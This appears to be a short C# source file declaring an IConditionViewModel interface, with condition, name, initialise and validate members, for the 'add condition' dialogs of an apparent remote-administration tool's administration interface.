using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.DynamicCommands;

namespace Orcus.Administration.ViewModels.AddCondition
{
    public interface IConditionViewModel
    {
        Condition Condition { get; }
        string ConditionName { get; }
        void Initialize(Condition condition);
        bool Validate(IWindow window);
    }
}